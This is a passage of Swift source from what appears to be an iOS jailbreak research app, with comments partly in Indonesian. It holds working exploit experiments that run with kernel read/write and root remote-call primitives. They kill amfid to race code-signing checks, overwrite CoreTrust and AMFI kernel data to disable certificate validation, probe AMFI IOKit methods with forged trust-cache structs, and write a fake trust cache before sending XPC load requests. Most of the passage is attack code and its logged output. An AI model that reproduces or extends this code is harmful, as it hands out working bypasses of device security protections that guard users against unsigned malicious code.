        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<256 {
                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
                if n == 0 || n == UInt64(bitPattern: -1) { break }
                RootExecutor.rcall(rc, "write", dstFd, buf, n)
                if n < 4096 { break }
            }
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "close", dstFd)
            RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)
            detail += "Binary ready at \(dstPath)\n\n"
        } else {
            detail += "❌ Cannot prepare binary\n"
            if srcFd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", srcFd) }
            if dstFd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", dstFd) }
        }

        // ============================================================
        // Step 3: Kill amfid + immediately spawn
        // ============================================================
        detail += "=== Step 3: Kill amfid + spawn race ===\n"
        detail += "Killing amfid PID \(amfidPid)...\n"

        // Kill amfid
        let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)  // SIGKILL
        detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"

        // IMMEDIATELY try to spawn (race window)
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(dstAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x480
        rc[pidAddr].setValue32(0)

        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstAddr, 0, 0, argvBase, 0)
        let spawnPid = rc[pidAddr].value32()
        detail += "posix_spawn (immediate): ret=\(spawnRet), pid=\(spawnPid)\n"

        var raceSuccess = false

        if spawnRet == 0 && spawnPid != 0 {
            // Wait briefly
            RootExecutor.rcall(rc, "usleep", 100000)  // 100ms
            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusAddr, UInt64(WNOHANG))
            let st = rc[statusAddr].value32()
            let sig = st & 0x7F
            let code = st >> 8
            detail += "child: signal=\(sig), code=\(code)\n"

            if sig != 9 {
                raceSuccess = true
                detail += "✅ NO SIGKILL! Binary survived!\n"
            } else {
                detail += "❌ Still SIGKILL — amfid restarted too fast or kernel enforces independently\n"
            }
        } else {
            detail += "spawn failed (ret=\(spawnRet))\n"

            // Try again with small delay
            RootExecutor.rcall(rc, "usleep", 10000)  // 10ms
            rc[pidAddr].setValue32(0)
            let spawnRet2 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstAddr, 0, 0, argvBase, 0)
            let spawnPid2 = rc[pidAddr].value32()
            detail += "posix_spawn (10ms delay): ret=\(spawnRet2), pid=\(spawnPid2)\n"

            if spawnRet2 == 0 && spawnPid2 != 0 {
                RootExecutor.rcall(rc, "usleep", 100000)
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid2), statusAddr, UInt64(WNOHANG))
                let st = rc[statusAddr].value32()
                let sig = st & 0x7F
                detail += "child: signal=\(sig)\n"
                if sig != 9 { raceSuccess = true }
            }
        }

        detail += "\n"

        // ============================================================
        // Step 4: Check if amfid restarted
        // ============================================================
        detail += "=== Step 4: amfid status ===\n"
        RootExecutor.rcall(rc, "usleep", 500000)  // wait 500ms

        let newAmfidProc = mgr.findProc(name: "amfid")
        if newAmfidProc != 0 {
            let newPid = ds_kread32_safe(newAmfidProc + UInt64(off_proc_p_pid))
            detail += "amfid restarted: new PID=\(newPid)\n"
        } else {
            detail += "⚠️ amfid NOT restarted yet (or findProc failed)\n"
        }

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstAddr)
        RootExecutor.rcall(rc, "free", srcAddr)
        RootExecutor.rcall(rc, "free", dstAddr)

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "\n=== VERDICT ===\n\n"
        if raceSuccess {
            detail += "🎉 RACE CONDITION WORKS!\n"
            detail += "Binary survived without SIGKILL during amfid downtime!\n"
            detail += "→ Repeat: kill amfid + spawn in loop for reliable exploit\n"
        } else {
            detail += "❌ Race failed — kernel enforces CS independently of amfid.\n\n"
            detail += "Ini konfirmasi: SIGKILL bukan dari amfid tapi dari KERNEL.\n"
            detail += "Kernel (mac_proc_check_run_cs_invalid) langsung kill\n"
            detail += "tanpa menunggu amfid response.\n\n"
            detail += "=== REMAINING OPTIONS ===\n"
            detail += "1. Patch amfid TEXT via physmap (need correct page table walk)\n"
            detail += "2. Kernel function call: trust_cache_runtime_add\n"
            detail += "3. CoreTrust certificate bypass (sign with accepted cert)\n"
            detail += "4. Find writable function pointer elsewhere in kernel heap\n"
        }

        return ExperimentResult(name: expName, success: raceSuccess, detail: detail, timestamp: Date())
    }

    // expDataConstWrite() REMOVED — caused kernel panic (KTRR fault on __DATA_CONST)

    // MARK: - Exp 98: CoreTrust __DATA Write Test

    /// Exp 98: CoreTrust __DATA mungkin writable (sama range dengan AMFI __DATA).
    /// Kalau writable → patch CoreTrust globals → bypass certificate validation.
    private func runExp98CoreTrustData() {
        isRunning = true
        runningLabel = "CT Write"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false; runningLabel = ""; return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expCoreTrustDataWrite()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
        }
    }

    private func expCoreTrustDataWrite() -> ExperimentResult {
        let expName = "CT Data Write (Exp 98)"
        var detail = "Experiment 98: CoreTrust __DATA Write Test\n"
        detail += "============================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // CoreTrust __DATA from kernelcache analysis
        let ctDataUnslid: UInt64 = 0xfffffff00a3b1230
        let ctDataSlid = ctDataUnslid &+ slide
        let ctDataSize: UInt64 = 0xe8

        detail += "CoreTrust __DATA (unslid): 0x\(String(format: "%llx", ctDataUnslid))\n"
        detail += "CoreTrust __DATA (slid):   0x\(String(format: "%llx", ctDataSlid))\n"
        detail += "CoreTrust __DATA size:     0x\(String(format: "%x", ctDataSize))\n\n"

        // Step 1: Read CoreTrust __DATA
        detail += "=== Step 1: Read CoreTrust __DATA ===\n"
        var nonZeroCount = 0
        for off: UInt64 in stride(from: 0, to: ctDataSize, by: 8) {
            let val = ds_kread64_safe(ctDataSlid + off)
            if val != 0 {
                nonZeroCount += 1
                if nonZeroCount <= 10 {
                    detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", val))\n"
                }
            }
        }
        detail += "Non-zero slots: \(nonZeroCount)\n\n"

        // Step 2: Write test — pick a safe slot (last non-zero or first zero)
        detail += "=== Step 2: Write test ===\n"

        // Find a zero slot to test (safest — won't corrupt anything)
        var testOffset: UInt64 = 0x40  // known zero slot from analysis
        let testAddr = ctDataSlid + testOffset
        let before = ds_kread64_safe(testAddr)
        detail += "Test target: CT __DATA+0x\(String(format: "%x", testOffset))\n"
        detail += "Before: 0x\(String(format: "%016llx", before))\n"

        // Write sentinel
        let sentinel: UInt64 = 0xDEADBEEF12345678
        ds_kwrite64(testAddr, sentinel)
        let after = ds_kread64_safe(testAddr)
        detail += "After write: 0x\(String(format: "%016llx", after))\n\n"

        let writeOK = (after == sentinel)

        if writeOK {
            // Restore
            ds_kwrite64(testAddr, before)
            detail += "✅✅✅ CoreTrust __DATA IS WRITABLE! ✅✅✅\n\n"
            detail += "CoreTrust fileset __DATA juga di luar KTRR!\n"
            detail += "Kita bisa patch CoreTrust globals!\n\n"
            detail += "=== NEXT STEPS ===\n"
            detail += "1. Identifikasi global mana yang kontrol validation\n"
            detail += "2. Patch untuk bypass certificate check\n"
            detail += "3. Sign binary dengan self-signed cert\n"
            detail += "4. posix_spawn → CoreTrust accept → binary jalan!\n"
        } else {
            detail += "❌ CoreTrust __DATA write FAILED.\n"
            if after == before {
                detail += "Write tidak efektif — KTRR protect.\n"
            }
        }

        return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 98b: CoreTrust Patch + Spawn Test

    /// Exp 98b: CoreTrust __DATA writable (confirmed Exp 98).
    /// Sekarang: zero-out SEMUA CoreTrust __DATA, lalu test posix_spawn.
    /// Hipotesis: CoreTrust globals mengontrol certificate validation.
    /// Kalau di-zero → validation disabled → unsigned binary accepted.
    private func runExp98bCoreTrustPatch() {
        isRunning = true
        runningLabel = "CT Patch"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false; runningLabel = ""; return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp98b_ct_patch") { rc in
            let result = self.expCoreTrustPatch(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    private func expCoreTrustPatch(rc: RemoteCall) -> ExperimentResult {
        let expName = "CT Patch+Spawn (Exp 98b)"
        var detail = "Experiment 98b: CoreTrust Patch + Spawn Test\n"
        detail += "==============================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        let mem = rc.trojanMem

        // CoreTrust __DATA
        let ctDataSlid = UInt64(0xfffffff00a3b1230) &+ slide
        let ctDataSize: UInt64 = 0xe8

        // AMFI __DATA (juga patch untuk maximize chance)
        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        let amfiFlagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "CT __DATA: 0x\(String(format: "%llx", ctDataSlid))\n"
        detail += "AMFI __DATA: 0x\(String(format: "%llx", amfiDataSlid))\n\n"

        // ============================================================
        // Step 1: Save original CoreTrust __DATA
        // ============================================================
        detail += "=== Step 1: Save CT __DATA original ===\n"
        var ctOriginal: [(offset: UInt64, value: UInt64)] = []
        for off: UInt64 in stride(from: 0, to: ctDataSize, by: 8) {
            let val = ds_kread64_safe(ctDataSlid + off)
            ctOriginal.append((off, val))
        }
        detail += "Saved \(ctOriginal.count) slots\n\n"

        // Save AMFI flags
        var amfiOriginal: [(offset: UInt64, value: UInt64)] = []
        for off in amfiFlagOffsets {
            let val = ds_kread64_safe(amfiDataSlid + off)
            amfiOriginal.append((off, val))
        }

        // ============================================================
        // Step 2: Baseline — spawn unsigned binary (should SIGKILL)
        // ============================================================
        detail += "=== Step 2: Baseline spawn (no patch) ===\n"

        // Copy amfid to /var/containers/Bundle/ (path that allows spawn)
        let srcPath = "/usr/libexec/amfid"
        let dstPath = "/var/containers/Bundle/.exp98b_test"
        let srcAddr = remote_alloc_str(rc, srcPath)
        let dstAddr = remote_alloc_str(rc, dstPath)

        RootExecutor.rcall(rc, "unlink", dstAddr)
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        let buf = mem + 0x800
        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
            for _ in 0..<256 {
                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
                if n == 0 || n == UInt64(bitPattern: -1) { break }
                RootExecutor.rcall(rc, "write", dstFd, buf, n)
                if n < 4096 { break }
            }
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)
        RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)

        // Baseline spawn
        let (blRet, blPid, blErr) = doSpawn(rc: rc, path: dstPath, mem: mem)
        var blSig: Int32 = -1
        if blRet == 0 && blPid != 0 {
            let (sig, code) = doWait(rc: rc, pid: blPid, mem: mem)
            blSig = sig
            detail += "Baseline: ret=0, pid=\(blPid), signal=\(sig), code=\(code)\n"
        } else {
            detail += "Baseline: ret=\(blRet), errno=\(blErr)\n"
        }
        detail += "\n"

        // ============================================================
        // Step 3: Patch CoreTrust __DATA (zero ALL) + AMFI flags
        // ============================================================
        detail += "=== Step 3: Patch CT + AMFI ===\n"

        // Zero out CoreTrust __DATA (except first 8 bytes which might be critical struct header)
        var ctPatchCount = 0
        for off: UInt64 in stride(from: 0x08, to: ctDataSize, by: 8) {
            let current = ds_kread64_safe(ctDataSlid + off)
            if current != 0 {
                ds_kwrite64(ctDataSlid + off, 0)
                let verify = ds_kread64_safe(ctDataSlid + off)
                if verify == 0 { ctPatchCount += 1 }
            }
        }
        detail += "CT __DATA zeroed: \(ctPatchCount) slots\n"

        // Also disable AMFI flags
        for off in amfiFlagOffsets {
            ds_kwrite64(amfiDataSlid + off, 0)
        }
        detail += "AMFI flags disabled: 10/10\n\n"

        // ============================================================
        // Step 4: Spawn test (CT + AMFI patched)
        // ============================================================
        detail += "=== Step 4: Spawn (CT zeroed + AMFI off) ===\n"

        let (pRet, pPid, pErr) = doSpawn(rc: rc, path: dstPath, mem: mem)
        var pSig: Int32 = -1
        if pRet == 0 && pPid != 0 {
            let (sig, code) = doWait(rc: rc, pid: pPid, mem: mem)
            pSig = sig
            detail += "Patched: ret=0, pid=\(pPid), signal=\(sig), code=\(code)\n"
        } else {
            detail += "Patched: ret=\(pRet), errno=\(pErr)\n"
        }
        detail += "\n"

        // ============================================================
        // Step 5: Also try with ONLY CT patched (AMFI flags restored)
        // ============================================================
        detail += "=== Step 5: Spawn (CT zeroed only, AMFI restored) ===\n"
        for (off, origVal) in amfiOriginal {
            ds_kwrite64(amfiDataSlid + off, origVal)
        }

        let (p2Ret, p2Pid, p2Err) = doSpawn(rc: rc, path: dstPath, mem: mem)
        var p2Sig: Int32 = -1
        if p2Ret == 0 && p2Pid != 0 {
            let (sig, code) = doWait(rc: rc, pid: p2Pid, mem: mem)
            p2Sig = sig
            detail += "CT-only: ret=0, pid=\(p2Pid), signal=\(sig), code=\(code)\n"
        } else {
            detail += "CT-only: ret=\(p2Ret), errno=\(p2Err)\n"
        }
        detail += "\n"

        // ============================================================
        // Step 6: Restore CoreTrust __DATA
        // ============================================================
        detail += "=== Step 6: Restore CT __DATA ===\n"
        for (off, origVal) in ctOriginal {
            ds_kwrite64(ctDataSlid + off, origVal)
        }
        detail += "Restored\n\n"

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstAddr)
        RootExecutor.rcall(rc, "free", srcAddr)
        RootExecutor.rcall(rc, "free", dstAddr)

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"
        detail += "Baseline:       signal=\(blSig) \(blSig == 9 ? "(SIGKILL)" : blSig == 0 ? "(clean)" : "")\n"
        detail += "CT+AMFI patch:  signal=\(pSig) \(pSig == 9 ? "(SIGKILL)" : pSig == 0 ? "(clean)" : "")\n"
        detail += "CT-only patch:  signal=\(p2Sig) \(p2Sig == 9 ? "(SIGKILL)" : p2Sig == 0 ? "(clean)" : "")\n\n"

        let success = (pSig != 9 && pSig >= 0 && blSig == 9) || (p2Sig != 9 && p2Sig >= 0 && blSig == 9)

        if success {
            detail += "🎉🎉🎉 CORETRUST BYPASS! 🎉🎉🎉\n\n"
            detail += "Baseline SIGKILL → patched NO SIGKILL!\n"
            detail += "CoreTrust __DATA patch disables certificate validation!\n\n"
            detail += "=== FULL JAILBREAK PATH ===\n"
            detail += "1. Zero CoreTrust __DATA\n"
            detail += "2. posix_spawn any binary from /var/containers/Bundle/\n"
            detail += "3. Binary runs without code signing!\n"
        } else if blSig == 9 && pSig == 9 && p2Sig == 9 {
            detail += "❌ Still SIGKILL with CT patched.\n"
            detail += "CoreTrust __DATA globals bukan enforcement control.\n"
            detail += "CDHash validation di kernel level (pmap_cs), bukan CoreTrust.\n\n"
            detail += "CoreTrust hanya dipanggil via amfid (userspace).\n"
            detail += "Kernel SIGKILL terjadi SEBELUM CoreTrust dipanggil.\n"
        } else if blSig != 9 {
            detail += "⚠️ Baseline juga tidak SIGKILL — test inconclusive.\n"
            detail += "Binary mungkin sudah trusted (CDHash match original).\n"
        } else {
            detail += "Mixed results — perlu analisis lebih lanjut.\n"
        }

        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 99: AMFI IOKit External Method Exploit

    /// Exp 99: Deep probe AMFI IOKit methods dengan struct input yang lebih targeted.
    /// Dari Exp 56/58: beberapa selector respond (2,4,5,6,7,9,11,12,13,14,15).
    /// Goal: find input yang trigger trust cache add atau bypass.
    private func runExp99AMFIIOKit() {
        isRunning = true
        runningLabel = "AMFI IOKit"
        guard mgr.rcready else {
            isRunning = false; runningLabel = ""; return
        }
        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(name: "AMFI IOKit (Exp 99)", success: false,
                detail: "No SpringBoard RC", timestamp: Date()), at: 0)
            isRunning = false; runningLabel = ""; return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expAMFIIOKitExploit(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expAMFIIOKitExploit(sb: RemoteCall) -> ExperimentResult {
        let expName = "AMFI IOKit Exploit (Exp 99)"
        var detail = "Experiment 99: AMFI IOKit Deep Probe\n"
        detail += "======================================\n\n"
        detail += "Target: find method that adds trust cache entry\n"
        detail += "or bypasses validation for specific binary.\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")

        // Open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        RootExecutor.rcall(sb, "free", nameAddr)

        guard svc != 0 else {
            detail += "❌ AMFI service not found\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()

        guard openRet == 0 && connect != 0 else {
            detail += "❌ Cannot open AMFI (ret=0x\(String(format: "%x", openRet)))\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ AMFI opened: connect=\(connect)\n\n"

        let structIn = mem + 0x2200
        let structOut = mem + 0x2400
        let structOutSize = mem + 0x2600
        let scalarIn = mem + 0x2800
        let scalarOut = mem + 0x2A00
        let scalarOutCnt = mem + 0x2C00

        var findings: [(sel: Int, desc: String, ret: UInt64)] = []

        // === Strategy 1: CDHash-based input ===
        // Some AMFI methods might accept CDHash for whitelist/query
        detail += "=== Strategy 1: CDHash input (20 bytes) ===\n"

        // Use a known CDHash (amfid's) to test query methods
        // CDHash of /usr/libexec/amfid would be in trust cache
        // Use zeros as "query" — might return info about validation state
        let testSelectors = [2, 4, 5, 9, 11, 12]

        for sel in testSelectors {
            // Input: 20 bytes CDHash (zeros = "any") + 4 bytes flags
            for i in 0..<4 { sb[structIn + UInt64(i * 8)].setValue64(0) }
            sb[structOutSize].setValue64(256)

            // Try struct method with CDHash-sized input (24 bytes)
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), UInt64(sel),
                                         structIn, 24,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()

            if ret == 0 {
                findings.append((sel, "struct24_zeros", ret))
                detail += "  ✅ sel \(sel) + 24B zeros: ret=0, outSize=\(outSize)\n"
                if outSize > 0 && outSize <= 64 {
                    let v0 = sb[structOut].value64()
                    detail += "     out[0]=0x\(String(format: "%llx", v0))\n"
                }
            } else if ret != 0xe00002bc && ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe0000001 {
                detail += "  ? sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                findings.append((sel, "struct24_unusual", ret))
            }
        }

        // === Strategy 2: PID-based input ===
        detail += "\n=== Strategy 2: PID input ===\n"
        let ourPid = RootExecutor.rcall(sb, "getpid")

        for sel in testSelectors {
            sb[scalarIn].setValue64(ourPid)
            sb[scalarIn + 8].setValue64(0)
            sb[scalarOutCnt].setValue32(16)

            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect), UInt64(sel),
                                         scalarIn, 1,
                                         scalarOut, scalarOutCnt)
            let outCnt = sb[scalarOutCnt].value32()

            if ret == 0 && outCnt > 0 {
                let val = sb[scalarOut].value64()
                findings.append((sel, "scalar_pid", ret))
                detail += "  ✅ sel \(sel) + PID \(ourPid): out=0x\(String(format: "%llx", val))\n"
            }
        }

        // === Strategy 3: Trust cache struct input ===
        detail += "\n=== Strategy 3: Trust cache struct ===\n"

        // Build minimal trust cache v2 struct
        sb[structIn + 0].setValue32(2)   // version = 2
        sb[structIn + 4].setValue64(0)   // uuid[0..7]
        sb[structIn + 12].setValue64(0)  // uuid[8..15]
        sb[structIn + 20].setValue32(1)  // count = 1
        // Entry at +24: 20 bytes CDHash + hashType + flags
        for i in 0..<3 { sb[structIn + 24 + UInt64(i * 8)].setValue64(0x4141414141414141) }

        for sel in [2, 5, 9, 11, 12, 13, 14, 15] {
            sb[structOutSize].setValue64(256)
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), UInt64(sel),
                                         structIn, 48,  // TC header + 1 entry
                                         structOut, structOutSize)

            if ret == 0 {
                findings.append((sel, "tc_struct", ret))
                detail += "  ✅ sel \(sel) + TC struct: ret=0!\n"
            } else if ret != 0xe00002bc && ret != 0xe00002c2 && ret != 0xe00002c7 {
                if ret != 0xe0000001 && ret != 0xfffffffd {
                    findings.append((sel, "tc_struct_unusual", ret))
                    detail += "  ? sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                }
            }
        }

        // === Strategy 4: IOConnectCallMethod (mixed scalar+struct) ===
        detail += "\n=== Strategy 4: Mixed scalar+struct ===\n"
        let ioConnectCallMethod = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                                     remote_alloc_str(sb, "IOConnectCallMethod"))
        if ioConnectCallMethod != 0 {
            // IOConnectCallMethod(connect, sel, scalarIn, scalarInCnt, structIn, structInSize,
            //                     scalarOut, &scalarOutCnt, structOut, &structOutSize)
            for sel in [2, 5, 9] {
                sb[scalarIn].setValue64(ourPid)  // scalar[0] = PID
                sb[scalarOutCnt].setValue32(16)
                sb[structOutSize].setValue64(256)

                // 1 scalar + 24 byte struct (CDHash)
                for i in 0..<3 { sb[structIn + UInt64(i * 8)].setValue64(0) }

                let ret = RootExecutor.rcallAddr(sb, ioConnectCallMethod,
                                                UInt64(connect), UInt64(sel),
                                                scalarIn, 1,
                                                structIn, 24)
                // Note: rcallAddr only supports 6 params, IOConnectCallMethod needs 10
                // This won't work properly but might reveal something
                if ret == 0 {
                    detail += "  ✅ sel \(sel) mixed: ret=0\n"
                    findings.append((sel, "mixed", ret))
                }
            }
        }

        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))

        // === VERDICT ===
        detail += "\n=== VERDICT ===\n\n"
        detail += "Findings: \(findings.count)\n"
        for f in findings.prefix(10) {
            detail += "  sel \(f.sel) (\(f.desc)): ret=0x\(String(format: "%x", f.ret))\n"
        }

        if findings.contains(where: { $0.ret == 0 }) {
            detail += "\n✅ Some methods accept our input!\n"
            detail += "Next: determine what these methods DO.\n"
            detail += "If any adds trust cache entry → JAILBREAK.\n"
        } else {
            detail += "\n❌ No method accepted our input formats.\n"
            detail += "AMFI IOKit methods likely need specific entitlement.\n"
        }

        return ExperimentResult(name: expName, success: !findings.isEmpty, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 100: Trust Cache Load via XPC

    /// Exp 100: Trigger trust cache load via MobileStorageMounter/mobileassetd XPC.
    /// Kedua daemon punya entitlement pmap.load-trust-cache.
    /// Test: connect ke XPC service, kirim message untuk load TC.
    private func runExp100TCLoadXPC() {
        isRunning = true
        runningLabel = "TC Load"
        guard mgr.rcready else {
            isRunning = false; runningLabel = ""; return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp100_tc_load") { rc in
            let result = self.expTCLoadXPC(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expTCLoadXPC(rc: RemoteCall) -> ExperimentResult {
        let expName = "TC Load XPC (Exp 100)"
        var detail = "Experiment 100: Trust Cache Load via XPC\n"
        detail += "==========================================\n\n"
        detail += "Target: MobileStorageMounter & mobileassetd\n"
        detail += "Kedua punya entitlement pmap.load-trust-cache\n\n"

        let mem = rc.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Step 1: Write fake trust cache ke /private/var/tmp/
        detail += "=== Step 1: Write fake trust cache ===\n"

        let tcPath = "/private/var/tmp/com.apple.mobile_storage_mounter/.fake_tc"
        let tcPathAddr = remote_alloc_str(rc, tcPath)

        // Buat directory dulu
        let dirPath = remote_alloc_str(rc, "/private/var/tmp/com.apple.mobile_storage_mounter")
        RootExecutor.rcall(rc, "mkdir", dirPath, 0o755)
        RootExecutor.rcall(rc, "free", dirPath)

        // Write minimal trust cache v2 struct
        RootExecutor.rcall(rc, "unlink", tcPathAddr)
        let fd = RootExecutor.rcall(rc, "open", tcPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)

        if fd != UInt64(bitPattern: -1) {
            let tcBuf = mem + 0x800
            // Trust cache v2: version(4) + uuid(16) + count(4) + entries
            rc[tcBuf + 0].setValue32(2)       // version = 2
            rc[tcBuf + 4].setValue64(0)       // uuid[0..7]
            rc[tcBuf + 12].setValue64(0)      // uuid[8..15]
            rc[tcBuf + 20].setValue32(1)      // count = 1
            // Entry: fake CDHash (20 bytes) + hashType(1) + flags(1) + pad(2)
            rc[tcBuf + 24].setValue64(0xDEADBEEFCAFEBABE)
            rc[tcBuf + 32].setValue64(0x1337133713371337)
            rc[tcBuf + 40].setValue32(0x0002DEAD)  // last 4 bytes CDHash + hashType=2
            RootExecutor.rcall(rc, "write", fd, tcBuf, 48)
            RootExecutor.rcall(rc, "close", fd)
            detail += "Fake TC written to \(tcPath)\n\n"
        } else {
            detail += "Cannot create TC file\n\n"
        }

        // Step 2: Try connect ke MobileStorageMounter XPC
        detail += "=== Step 2: XPC connections ===\n"

        let xpcServices = [
            "com.apple.mobile.storage_mounter",
            "com.apple.mobile.storage_mounter.xpc",
            "com.apple.security.cryptexd",
            "com.apple.mobileassetd",
        ]

        let xpcConnect = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(rc, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(rc, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(rc, "xpc_dictionary_create"))
        let xpcDictSetStr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(rc, "xpc_dictionary_set_string"))
        let xpcSend = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(rc, "xpc_connection_send_message"))

        detail += "xpc_connection_create: 0x\(String(format: "%llx", xpcConnect))\n"
        detail += "xpc_connection_resume: 0x\(String(format: "%llx", xpcResume))\n"
        detail += "xpc_dictionary_create: 0x\(String(format: "%llx", xpcDictCreate))\n\n"

        guard xpcConnect != 0 && xpcResume != 0 && xpcDictCreate != 0 else {
            detail += "XPC functions not available\n"
            RootExecutor.rcall(rc, "unlink", tcPathAddr)
            RootExecutor.rcall(rc, "free", tcPathAddr)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        var anyConnected = false

        for service in xpcServices {
            let svcAddr = remote_alloc_str(rc, service)

            // xpc_connection_create_mach_service(name, NULL, 0)
            let conn = RootExecutor.rcall(rc, "xpc_connection_create_mach_service", svcAddr, 0, 0)
            detail += "[\(service)]:\n"
            detail += "  connection: 0x\(String(format: "%llx", conn))\n"

            if conn != 0 {
                anyConnected = true

                // Resume connection
                RootExecutor.rcallAddr(rc, xpcResume, conn)

                // Create message dictionary
                let msg = RootExecutor.rcallAddr(rc, xpcDictCreate, 0, 0, 0)
                detail += "  message: 0x\(String(format: "%llx", msg))\n"

                if msg != 0 && xpcDictSetStr != 0 {
                    // Set "path" key to our trust cache
                    let keyPath = remote_alloc_str(rc, "path")
                    let keyAction = remote_alloc_str(rc, "action")
                    let valLoad = remote_alloc_str(rc, "load-trust-cache")

                    RootExecutor.rcallAddr(rc, xpcDictSetStr, msg, keyPath, tcPathAddr)
                    RootExecutor.rcallAddr(rc, xpcDictSetStr, msg, keyAction, valLoad)

                    // Send message
                    if xpcSend != 0 {
                        RootExecutor.rcallAddr(rc, xpcSend, conn, msg)
                        detail += "  Sent load-trust-cache message!\n"
                    }

                    RootExecutor.rcall(rc, "free", keyPath)
                    RootExecutor.rcall(rc, "free", keyAction)
                    RootExecutor.rcall(rc, "free", valLoad)
                }
            } else {
                detail += "  FAILED to connect\n"
            }
